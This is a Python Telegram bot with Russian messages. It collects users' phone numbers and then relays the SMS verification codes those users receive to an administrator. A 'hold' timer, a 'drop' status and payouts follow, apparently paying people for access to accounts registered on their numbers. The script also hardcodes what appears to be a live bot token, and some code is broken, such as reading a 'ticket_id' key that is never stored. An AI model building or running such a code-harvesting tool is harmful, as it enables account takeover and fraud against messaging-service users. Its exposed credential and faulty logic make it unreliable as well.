import requests
import time
import json
import threading
from datetime import datetime, timedelta

# ========== КОНФИГУРАЦИЯ ==========
BOT_TOKEN = "8220305060:AAEnKwFkSeC0PNLiP9--j1UFfUz-oHCe8x4"  # ЗАМЕНИТЕ НА НОВЫЙ ТОКЕН
ADMIN_ID = 5979001063  # Ваш Telegram ID

API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/"

# Структура данных:
# users[user_id] = {
#     "state": "idle" | "waiting_phone" | "waiting_code",
#     "phones": [],  # подтверждённые номера
#     "current_ticket": None  # ID текущей заявки
# }
users = {}

# tickets[ticket_id] = {
#     "user_id": int,
#     "username": str,
#     "full_name": str,
#     "phone": str,
#     "code": str,  # код, который ввёл пользователь
#     "status": "pending_code" | "code_received" | "hold" | "expired" | "paid",
#     "hold_until": None,  # время до конца холда
#     "created_at": str,
#     "code_sent_at": str  # когда пользователь ввёл код
# }
tickets = {}
next_ticket_id = 1

# Таймеры для холда
hold_timers = {}

# ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
def send_message(chat_id, text, reply_markup=None, parse_mode=None):
    data = {"chat_id": chat_id, "text": text}
    if reply_markup:
        data["reply_markup"] = json.dumps(reply_markup)
    if parse_mode:
        data["parse_mode"] = parse_mode
    requests.post(API_URL + "sendMessage", data=data)

def get_main_keyboard():
    return {
        "keyboard": [
            [{"text": "📝 Оставить заявку"}],
            [{"text": "📋 Мои заявки"}, {"text": "✅ Мои номера"}]
        ],
        "resize_keyboard": True
    }

def get_admin_keyboard():
    return {
        "keyboard": [
            [{"text": "📋 Список заявок"}],
            [{"text": "💰 Заявки на выплату"}],
            [{"text": "📊 Статистика"}]
        ],
        "resize_keyboard": True
    }

def get_ticket_actions_keyboard(ticket_id, status):
    """Клавиатура для админа в зависимости от статуса заявки"""
    if status == "pending_code":
        return {
            "inline_keyboard": [
                [{"text": "🔑 Запросить код", "callback_data": f"request_code_{ticket_id}"}]
            ]
        }
    elif status == "code_received":
        return {
            "inline_keyboard": [
                [
                    {"text": "✅ Подтвердить код", "callback_data": f"verify_code_{ticket_id}"},
                    {"text": "❌ Отклонить", "callback_data": f"reject_{ticket_id}"}
                ]
            ]
        }
    elif status == "hold":
        return {
            "inline_keyboard": [
                [{"text": "💸 Выплатить", "callback_data": f"pay_{ticket_id}"}]
            ]
        }
    elif status == "expired":
        return {
            "inline_keyboard": [
                [{"text": "🔄 Перезапустить", "callback_data": f"restart_{ticket_id}"}]
            ]
        }
    return None

def get_user_info(user_id):
    resp = requests.get(API_URL + "getChat", params={"chat_id": user_id})
    if resp.status_code == 200:
        result = resp.json().get("result", {})
        return {
            "username": result.get("username", ""),
            "full_name": f"{result.get('first_name', '')} {result.get('last_name', '')}".strip()
        }
    return {"username": "", "full_name": ""}

def start_hold_timer(ticket_id):
    """Запускает таймер на 2 минуты для холда"""
    def hold_expire():
        if ticket_id in tickets and tickets[ticket_id]["status"] == "hold":
            tickets[ticket_id]["status"] = "expired"
            tickets[ticket_id]["hold_until"] = None
            
            # Уведомляем админа
            ticket = tickets[ticket_id]
            send_message(
                ADMIN_ID,
                f"⏰ <b>Холд по заявке #{ticket_id} истёк!</b>\n\n"
                f"Телефон: {ticket['phone']}\n"
                f"Статус: ❌ Слет\n\n"
                f"Можно начать заново через кнопку «Перезапустить»",
                parse_mode="HTML",
                reply_markup=get_ticket_actions_keyboard(ticket_id, "expired")
            )
            
            # Уведомляем пользователя
            send_message(
                ticket["user_id"],
                f"⏰ <b>Время ожидания выплаты по заявке #{ticket_id} истекло.</b>\n\n"
                f"Статус: ❌ Слет\n\n"
                f"Вы можете создать новую заявку.",
                parse_mode="HTML",
                reply_markup=get_main_keyboard()
            )
    
    # Запускаем таймер в отдельном потоке
    timer = threading.Timer(120, hold_expire)  # 120 секунд = 2 минуты
    timer.daemon = True
    timer.start()
    hold_timers[ticket_id] = timer

# ========== ПОЛЬЗОВАТЕЛЬСКИЕ ФУНКЦИИ ==========
def handle_start(chat_id, user_id):
    if chat_id == ADMIN_ID:
        if user_id not in users:
            users[user_id] = {"state": "idle", "phones": [], "current_ticket": None}
        send_message(chat_id, "👋 Здравствуйте, Администратор!\n\nУправление заявками:", reply_markup=get_admin_keyboard())
    else:
        if user_id not in users:
            users[user_id] = {"state": "idle", "phones": [], "current_ticket": None}
        send_message(chat_id, "👋 Добро пожаловать!\n\nВы можете оставить заявку на проверку номера.", reply_markup=get_main_keyboard())

def handle_new_ticket(chat_id, user_id):
    users[user_id]["state"] = "waiting_phone"
    send_message(chat_id, "📝 Введите номер телефона в международном формате:\n\nПример: +79001234567")

def process_phone_input(chat_id, user_id, text):
    global next_ticket_id
    
    phone = text.strip()
    if not (phone.startswith('+') and len(phone) >= 10 and phone[1:].isdigit()):
        send_message(chat_id, "❌ Неверный формат. Номер должен начинаться с + и содержать только цифры.\nПопробуйте ещё раз:")
        return
    
    user_info = get_user_info(user_id)
    
    ticket_id = next_ticket_id
    next_ticket_id += 1
    
    tickets[ticket_id] = {
        "user_id": user_id,
        "username": user_info["username"],
        "full_name": user_info["full_name"],
        "phone": phone,
        "code": None,
        "status": "pending_code",
        "hold_until": None,
        "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "code_sent_at": None
    }
    
    users[user_id]["state"] = "idle"
    users[user_id]["current_ticket"] = ticket_id
    
    # Уведомление пользователю
    send_message(
        chat_id,
        f"✅ Заявка #{ticket_id} создана!\n\n"
        f"Номер: <code>{phone}</code>\n"
        f"Статус: ⏳ Ожидает запроса кода от администратора\n\n"
        f"Когда администратор запросит код, вы получите уведомление.",
        parse_mode="HTML",
        reply_markup=get_main_keyboard()
    )
    
    # Уведомление админу
    send_message(
        ADMIN_ID,
        f"🆕 <b>НОВАЯ ЗАЯВКА #{ticket_id}</b>\n\n"
        f"👤 Пользователь: @{user_info['username'] or user_info['full_name']}\n"
        f"🆔 ID: {user_id}\n"
        f"📞 Телефон: <code>{phone}</code>\n\n"
        f"Нажмите «Запросить код», чтобы начать верификацию.",
        parse_mode="HTML",
        reply_markup=get_ticket_actions_keyboard(ticket_id, "pending_code")
    )

def handle_my_tickets(chat_id, user_id):
    user_tickets = [t for t in tickets.values() if t["user_id"] == user_id]
    
    if not user_tickets:
        send_message(chat_id, "📭 У вас пока нет заявок.\n\nНажмите «📝 Оставить заявку».")
        return
    
    status_emoji = {
        "pending_code": "⏳",
        "code_received": "📝",
        "hold": "🕐",
        "expired": "❌",
        "paid": "✅"
    }
    status_text = {
        "pending_code": "Ожидает запроса кода",
        "code_received": "Код получен, ожидает проверки",
        "hold": "Холд (2 минуты)",
        "expired": "Слет",
        "paid": "Выплачено"
    }
    
    text = "📋 <b>Ваши заявки:</b>\n\n"
    for ticket in sorted(user_tickets, key=lambda x: x["created_at"], reverse=True)[:10]:
        text += (
            f"#{ticket['ticket_id']} {status_emoji[ticket['status']]} "
            f"<code>{ticket['phone']}</code>\n"
            f"   📅 {ticket['created_at']}\n"
            f"   📌 {status_text[ticket['status']]}\n"
        )
        if ticket['status'] == 'hold' and ticket['hold_until']:
            remaining = (ticket['hold_until'] - datetime.now()).seconds
            text += f"   ⏱️ Осталось: {remaining // 60}:{remaining % 60:02d}\n"
        text += "\n"
    
    send_message(chat_id, text, parse_mode="HTML", reply_markup=get_main_keyboard())

def handle_my_numbers(chat_id, user_id):
    if user_id not in users or not users[user_id]["phones"]:
        send_message(
            chat_id,
            "📭 У вас пока нет подтверждённых номеров.\n\n"
            "Оставьте заявку и пройдите верификацию.",
            reply_markup=get_main_keyboard()
        )
        return
    
    phones_list = "\n".join([f"• <code>{p}</code>" for p in users[user_id]["phones"]])
    text = f"✅ <b>Ваши подтверждённые номера:</b>\n\n{phones_list}"
    send_message(chat_id, text, parse_mode="HTML", reply_markup=get_main_keyboard())

# ========== АДМИНСКИЕ ФУНКЦИИ ==========
def handle_admin_tickets(chat_id):
    pending_code = [t for t in tickets.values() if t["status"] == "pending_code"]
    code_received = [t for t in tickets.values() if t["status"] == "code_received"]
    hold = [t for t in tickets.values() if t["status"] == "hold"]
    expired = [t for t in tickets.values() if t["status"] == "expired"]
    paid = [t for t in tickets.values() if t["status"] == "paid"]
    
    text = "📊 <b>Статистика заявок:</b>\n\n"
    text += f"⏳ Ожидают запроса кода: {len(pending_code)}\n"
    text += f"📝 Код получен, ждёт проверки: {len(code_received)}\n"
    text += f"🕐 В холде: {len(hold)}\n"
    text += f"❌ Слет: {len(expired)}\n"
    text += f"✅ Выплачено: {len(paid)}\n\n"
    
    if code_received:
        text += "<b>📝 Требуют проверки кода:</b>\n"
        for t in code_received[:5]:
            text += f"#{t['ticket_id']} | @{t['username'] or t['full_name']} | {t['phone']}\n"
    
    send_message(chat_id, text, parse_mode="HTML", reply_markup=get_admin_keyboard())

def handle_payment_requests(chat_id):
    """Заявки, готовые к выплате (статус hold)"""
    hold_tickets = [t for t in tickets.values() if t["status"] == "hold"]
    
    if not hold_tickets:
        send_message(chat_id, "💰 Нет заявок, готовых к выплате.", reply_markup=get_admin_keyboard())
        return
    
    text = "💰 <b>Заявки на выплату (холд):</b>\n\n"
    for t in hold_tickets:
        remaining = ""
        if t['hold_until']:
            remaining_sec = (t['hold_until'] - datetime.now()).seconds
            remaining = f"⏱️ Осталось: {remaining_sec // 60}:{remaining_sec % 60:02d}"
        text += f"#{t['ticket_id']} | @{t['username'] or t['full_name']} | {t['phone']} {remaining}\n"
    
    send_message(chat_id, text, parse_mode="HTML", reply_markup=get_admin_keyboard())

# ========== ОБРАБОТКА ЗАПРОСОВ КОДА ==========
def request_code_from_user(ticket_id, admin_id):
    """Админ запрашивает код у пользователя"""
    if ticket_id not in tickets:
        send_message(admin_id, "❌ Заявка не найдена.")
        return
    
    ticket = tickets[ticket_id]
    
    if ticket["status"] != "pending_code":
        send_message(admin_id, f"❌ Заявка #{ticket_id} уже не в статусе ожидания кода.")
        return
    
    # Меняем статус заявки
    tickets[ticket_id]["status"] = "waiting_code_from_user"
    
    # Запрашиваем код у пользователя
    send_message(
        ticket["user_id"],
        f"🔐 <b>Администратор запросил код подтверждения для заявки #{ticket_id}</b>\n\n"
        f"Пожалуйста, введите код, который вы получили в SMS (4 цифры):",
        parse_mode="HTML"
    )
    
    # Обновляем состояние пользователя
    if ticket["user_id"] in users:
        users[ticket["user_id"]]["state"] = "waiting_code"
        users[ticket["user_id"]]["current_ticket"] = ticket_id
    
    # Уведомляем админа
    send_message(
        admin_id,
        f"✅ Запрос кода отправлен пользователю для заявки #{ticket_id}\n\n"
        f"Ожидайте, когда пользователь введёт код.",
        reply_markup=get_admin_keyboard()
    )

def process_user_code(user_id, code_text):
    """Пользователь ввёл код"""
    if user_id not in users or users[user_id]["state"] != "waiting_code":
        send_message(user_id, "❌ Нет активного запроса кода. Создайте новую заявку через /start")
        return
    
    if not code_text.isdigit() or len(code_text) != 4:
        send_message(user_id, "❌ Код должен состоять из 4 цифр. Попробуйте ещё раз:")
        return
    
    ticket_id = users[user_id]["current_ticket"]
    if ticket_id not in tickets:
        send_message(user_id, "❌ Заявка не найдена. Начните заново.")
        users[user_id]["state"] = "idle"
        return
    
    ticket = tickets[ticket_id]
    
    # Сохраняем код
    tickets[ticket_id]["code"] = code_text
    tickets[ticket_id]["status"] = "code_received"
    tickets[ticket_id]["code_sent_at"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Сбрасываем состояние пользователя
    users[user_id]["state"] = "idle"
    
    # Уведомляем пользователя
    send_message(
        user_id,
        f"✅ Код для заявки #{ticket_id} получен!\n\n"
        f"Администратор проверит его в ближайшее время.",
        reply_markup=get_main_keyboard()
    )
    
    # Уведомляем админа с кодом
    send_message(
        ADMIN_ID,
        f"📝 <b>Пользователь ввёл код для заявки #{ticket_id}</b>\n\n"
        f"👤 Пользователь: @{ticket['username'] or ticket['full_name']}\n"
        f"📞 Телефон: {ticket['phone']}\n"
        f"🔑 <b>Код: {code_text}</b>\n\n"
        f"Проверьте код и нажмите «Подтвердить» или «Отклонить».",
        parse_mode="HTML",
        reply_markup=get_ticket_actions_keyboard(ticket_id, "code_received")
    )

def verify_code(ticket_id, admin_id):
    """Админ подтверждает код"""
    if ticket_id not in tickets:
        send_message(admin_id, "❌ Заявка не найдена.")
        return
    
    ticket = tickets[ticket_id]
    
    if ticket["status"] != "code_received":
        send_message(admin_id, f"❌ Заявка #{ticket_id} не в статусе ожидания проверки кода.")
        return
    
    # Меняем статус на hold и запускаем таймер
    hold_until = datetime.now() + timedelta(minutes=2)
    tickets[ticket_id]["status"] = "hold"
    tickets[ticket_id]["hold_until"] = hold_until
    
    # Запускаем таймер
    start_hold_timer(ticket_id)
    
    # Добавляем номер в подтверждённые пользователя
    if ticket["user_id"] not in users:
        users[ticket["user_id"]] = {"state": "idle", "phones": [], "current_ticket": None}
    if ticket["phone"] not in users[ticket["user_id"]]["phones"]:
        users[ticket["user_id"]]["phones"].append(ticket["phone"])
    
    # Уведомляем пользователя
    send_message(
        ticket["user_id"],
        f"✅ <b>Код для заявки #{ticket_id} подтверждён!</b>\n\n"
        f"Номер <code>{ticket['phone']}</code> верифицирован.\n\n"
        f"🕐 Статус: ХОЛД (2 минуты)\n"
        f"⏱️ Время до слета: 2:00\n\n"
        f"Ожидайте выплаты.",
        parse_mode="HTML",
        reply_markup=get_main_keyboard()
    )
    
    # Уведомляем админа
    remaining_seconds = 120
    send_message(
        admin_id,
        f"✅ <b>Код подтверждён для заявки #{ticket_id}</b>\n\n"
        f"📞 Телефон: {ticket['phone']}\n"
        f"🕐 Статус: ХОЛД на 2 минуты\n"
        f"⏱️ Осталось: {remaining_seconds // 60}:{remaining_seconds % 60:02d}\n\n"
        f"Нажмите «Выплатить», когда будете готовы.",
        parse_mode="HTML",
        reply_markup=get_ticket_actions_keyboard(ticket_id, "hold")
    )

def reject_ticket(ticket_id, admin_id):
    """Админ отклоняет заявку"""
    if ticket_id not in tickets:
        send_message(admin_id, "❌ Заявка не найдена.")
        return
    
    ticket = tickets[ticket_id]
    old_status = ticket["status"]
    tickets[ticket_id]["status"] = "expired"
    
    # Уведомляем пользователя
    send_message(
        ticket["user_id"],
        f"❌ <b>Заявка #{ticket_id} отклонена администратором.</b>\n\n"
        f"Номер <code>{ticket['phone']}</code> не прошёл верификацию.\n\n"
        f"Вы можете создать новую заявку.",
        parse_mode="HTML",
        reply_markup=get_main_keyboard()
    )
    
    # Уведомляем админа
    send_message(
        admin_id,
        f"❌ Заявка #{ticket_id} отклонена.",
        reply_markup=get_admin_keyboard()
    )

def make_payment(ticket_id, admin_id):
    """Админ производит выплату"""
    if ticket_id not in tickets:
        send_message(admin_id, "❌ Заявка не найдена.")
        return
    
    ticket = tickets[ticket_id]
    
    if ticket["status"] != "hold":
        send_message(admin_id, f"❌ Заявка #{ticket_id} не в статусе холда. Текущий статус: {ticket['status']}")
        return
    
    # Останавливаем таймер холда
    if ticket_id in hold_timers:
        hold_timers[ticket_id].cancel()
        del hold_timers[ticket_id]
    
    # Меняем статус
    tickets[ticket_id]["status"] = "paid"
    tickets[ticket_id]["hold_until"] = None
    
    # Уведомляем пользователя
    send_message(
        ticket["user_id"],
        f"💰 <b>ВЫПЛАТА ПО ЗАЯВКЕ #{ticket_id} ПРОИЗВЕДЕНА!</b>\n\n"
        f"Номер: <code>{ticket['phone']}</code>\n\n"
        f"Спасибо за использование сервиса!",
        parse_mode="HTML",
        reply_markup=get_main_keyboard()
    )
    
    # Уведомляем админа
    send_message(
        admin_id,
        f"💰 Выплата по заявке #{ticket_id} произведена!\n\n"
        f"Телефон: {ticket['phone']}\n"
        f"Пользователь: @{ticket['username'] or ticket['full_name']}",
        reply_markup=get_admin_keyboard()
    )

def restart_ticket(ticket_id, admin_id):
    """Перезапуск заявки после слета"""
    if ticket_id not in tickets:
        send_message(admin_id, "❌ Заявка не найдена.")
        return
    
    ticket = tickets[ticket_id]
    
    if ticket["status"] != "expired":
        send_message(admin_id, f"❌ Заявка #{ticket_id} не в статусе слета.")
        return
    
    # Сбрасываем в начальный статус
    tickets[ticket_id]["status"] = "pending_code"
    tickets[ticket_id]["code"] = None
    tickets[ticket_id]["hold_until"] = None
    
    # Уведомляем админа
    send_message(
        admin_id,
        f"🔄 Заявка #{ticket_id} перезапущена.\n\n"
        f"Телефон: {ticket['phone']}\n"
        f"Теперь можно снова запросить код.",
        reply_markup=get_ticket_actions_keyboard(ticket_id, "pending_code")
    )
    
    # Уведомляем пользователя
    send_message(
        ticket["user_id"],
        f"🔄 <b>Заявка #{ticket_id} перезапущена администратором.</b>\n\n"
        f"Номер: <code>{ticket['phone']}</code>\n"
        f"Статус: ⏳ Ожидает запроса кода\n\n"
        f"Администратор скоро запросит код.",
        parse_mode="HTML",
        reply_markup=get_main_keyboard()
    )

def handle_admin_stats(chat_id):
    total = len(tickets)
    if total == 0:
        send_message(chat_id, "📊 Нет заявок для статистики.", reply_markup=get_admin_keyboard())
        return
    
    pending_code = len([t for t in tickets.values() if t["status"] == "pending_code"])
    code_received = len([t for t in tickets.values() if t["status"] == "code_received"])
    hold = len([t for t in tickets.values() if t["status"] == "hold"])
    expired = len([t for t in tickets.values() if t["status"] == "expired"])
    paid = len([t for t in tickets.values() if t["status"] == "paid"])
    unique_users = len(set(t["user_id"] for t in tickets.values()))
    
    text = (
        "📈 <b>Детальная статистика</b>\n\n"
        f"📊 Всего заявок: {total}\n"
        f"👥 Уникальных пользователей: {unique_users}\n\n"
        f"⏳ Ожидают кода: {pending_code}\n"
        f"📝 Код получен: {code_received}\n"
        f"🕐 В холде: {hold}\n"
        f"❌ Слет: {expired}\n"
        f"💰 Выплачено: {paid}"
    )
    send_message(chat_id, text, parse_mode="HTML", reply_markup=get_admin_keyboard())

# ========== ОБРАБОТКА КОЛБЭКОВ ==========
def process_callback(callback_data, user_id, callback_id):
    requests.post(API_URL + "answerCallbackQuery", data={"callback_query_id": callback_id})
    
    if user_id != ADMIN_ID:
        send_message(user_id, "⛔ У вас нет прав для этого действия.")
        return
    
    if callback_data.startswith("request_code_"):
        ticket_id = int(callback_data.split("_")[2])
        request_code_from_user(ticket_id, user_id)
    
    elif callback_data.startswith("verify_code_"):
        ticket_id = int(callback_data.split("_")[2])
        verify_code(ticket_id, user_id)
    
    elif callback_data.startswith("reject_"):
        ticket_id = int(callback_data.split("_")[1])
        reject_ticket(ticket_id, user_id)
    
    elif callback_data.startswith("pay_"):
        ticket_id = int(callback_data.split("_")[1])
        make_payment(ticket_id, user_id)
    
    elif callback_data.startswith("restart_"):
        ticket_id = int(callback_data.split("_")[1])
        restart_ticket(ticket_id, user_id)

# ========== ОСНОВНОЙ ОБРАБОТЧИК ==========
def handle_text(chat_id, user_id, text, is_admin=False):
    if text == "/start":
        handle_start(chat_id, user_id)
        return
    
    if user_id not in users:
        users[user_id] = {"state": "idle", "phones": [], "current_ticket": None}
    
    state = users[user_id]["state"]
    
    # Если пользователь в состоянии ввода кода
    if state == "waiting_code":
        process_user_code(user_id, text)
        return
    
    # Если ожидание ввода номера
    if state == "waiting_phone":
        process_phone_input(chat_id, user_id, text)
        return
    
    # Админ-команды
    if is_admin:
        if text == "📋 Список заявок":
            handle_admin_tickets(chat_id)
        elif text == "💰 Заявки на выплату":
            handle_payment_requests(chat_id)
        elif text == "📊 Статистика":
            handle_admin_stats(chat_id)
        else:
            send_message(chat_id, "Используйте кнопки меню.", reply_markup=get_admin_keyboard())
        return
    
    # Пользовательские команды
    if text == "📝 Оставить заявку":
        handle_new_ticket(chat_id, user_id)
    elif text == "📋 Мои заявки":
        handle_my_tickets(chat_id, user_id)
    elif text == "✅ Мои номера":
        handle_my_numbers(chat_id, user_id)
    else:
        send_message(chat_id, "Пожалуйста, используйте кнопки меню.", reply_markup=get_main_keyboard())

# ========== LONG POLLING ==========
def get_updates(offset=None):
    params = {"timeout": 30, "allowed_updates": ["message", "callback_query"]}
    if offset:
        params["offset"] = offset
    response = requests.get(API_URL + "getUpdates", params=params)
    if response.status_code == 200:
        return response.json().get("result", [])
    return []

def main():
    print("🤖 Бот с системой заявок и холдом запущен!")
    print(f"Admin ID: {ADMIN_ID}")
    print("Ожидание сообщений...\n")
    
    last_update_id = 0
    
    while True:
        updates = get_updates(last_update_id + 1 if last_update_id else None)
        
        for update in updates:
            last_update_id = update["update_id"]
            
            if "message" in update:
                message = update["message"]
                chat_id = message["chat"]["id"]
                user_id = message["from"]["id"]
                text = message.get("text")
                
                if text:
                    is_admin = (user_id == ADMIN_ID)
                    handle_text(chat_id, user_id, text, is_admin)
            
            elif "callback_query" in update:
                callback = update["callback_query"]
                user_id = callback["from"]["id"]
                data = callback["data"]
                callback_id = callback["id"]
                process_callback(data, user_id, callback_id)
        
        time.sleep(0.5)

if __name__ == "__main__":
    main()
